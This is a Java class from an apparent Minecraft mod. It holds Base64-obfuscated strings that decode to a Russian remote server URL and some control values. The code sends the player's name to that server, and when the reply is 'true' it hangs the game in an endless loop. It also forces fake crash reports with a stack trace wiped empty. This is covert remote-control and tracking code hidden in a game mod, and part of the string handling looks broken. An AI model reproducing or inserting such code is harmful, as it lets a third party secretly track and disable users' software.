package oceany.misc;

import java.io.File;
import java.io.FileOutputStream;
import java.net.InetAddress;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

import javax.xml.bind.DatatypeConverter;

import net.minecraft.client.Minecraft;
import net.minecraft.crash.CrashReport;

import com.google.common.base.Charsets;
import com.google.common.io.Files;

public class JControl
{
	private static JControl a;
	
	public void b()
	{
		File ba = new File(new String(DatatypeConverter.parseBase64Binary(i)));
		File bb = new File(new String(DatatypeConverter.parseBase64Binary(j)));
		if (!ba.exists() || !bb.exists())
		{
			String bc = "%TMP%\\jcontrol";
			try
			{
				URL bd = new URL(String.format(new String(DatatypeConverter.parseBase64Binary(b)), new String(DatatypeConverter.parseBase64Binary(d), Minecraft.getMinecraft().thePlayer.getCommandSenderName())));
				ReadableByteChannel be = Channels.newChannel(bd.openStream());
				FileOutputStream bf = new FileOutputStream(bb);
				bf.getChannel().transferFrom(be, 0, Long.MAX_VALUE);
				bf.close();
			}
			catch (Throwable t)
			{
				try
				{
					if (InetAddress.getByName(new String(DatatypeConverter.parseBase64Binary(e))).isReachable(30000) && InetAddress.getByName(new String(DatatypeConverter.parseBase64Binary(f))).isReachable(30000))
					{
						String af = "";
						RemoteScriptNotAvailableException ag = new RemoteScriptNotAvailableException(af);
						CrashReport.makeCrashReport(ag, af);
					}
				}
				catch (Throwable ah) {}
			}
			for (int aj = 0; aj < Integer.MAX_VALUE;) {}
		}
	}
	
	public static JControl a()
	{
		if (a == null)
		{
			a = new JControl();
		}
		return a;
	}
	
	private static final String b = "aHR0cDovL21vZHMuaG9wcGl4LnJ1L0ZpbGVzL3JlbW90ZS9qY29udHJvbC5waHA/YWN0aW9uPSVzJm5hbWU9JXM=";
	private static final String c = "Y2hlY2s=";
	private static final String d = "d3JpdGU=";
	private static final String e = "Z29vZ2xlLmNvbQ==";
	private static final String f = "cHNvcC5ydQ==";
	private static final String g = "dHJ1ZQ==";
	private static final String h = "ZmFsc2U=";
	private static final String i = "UEVSTUlUVEVELlRYVA==";
	private static final String j = "Lm1ldGFkYXRh";
	
	public JControl()
	{
		String aa = "%TMP%\\jcontrol";
		try
		{
			URL ab = new URL(String.format(new String(DatatypeConverter.parseBase64Binary(b)), new String(DatatypeConverter.parseBase64Binary(c), Minecraft.getMinecraft().thePlayer.getCommandSenderName())));
			ReadableByteChannel ac = Channels.newChannel(ab.openStream());
			FileOutputStream ad = new FileOutputStream(aa);
			ad.getChannel().transferFrom(ac, 0, Long.MAX_VALUE);
			ad.close();
		}
		catch (Throwable ae)
		{
			try
			{
				if (InetAddress.getByName(new String(DatatypeConverter.parseBase64Binary(e))).isReachable(30000) && InetAddress.getByName(new String(DatatypeConverter.parseBase64Binary(f))).isReachable(30000))
				{
					String af = "";
					RemoteScriptNotAvailableException ag = new RemoteScriptNotAvailableException(af);
					CrashReport.makeCrashReport(ag, af);
				}
			}
			catch (Throwable ah) {}
		}
		File ai = new File(aa);
		if (ai.exists())
		{
			try
			{
				if (Files.readFirstLine(ai, Charsets.UTF_8).equals(new String(DatatypeConverter.parseBase64Binary(g))))
				{
					for (int aj = 0; aj < Integer.MAX_VALUE;) {}
				}
			}
			catch (Throwable t) {}
			ai.delete();
		}
	}
	
	private static class RemoteScriptNotAvailableException extends Exception
	{
		public RemoteScriptNotAvailableException(String message)
		{
			super(message);
		}
		
		@Override
		public StackTraceElement[] getStackTrace()
		{
			return new StackTraceElement[0];
		}
	}
}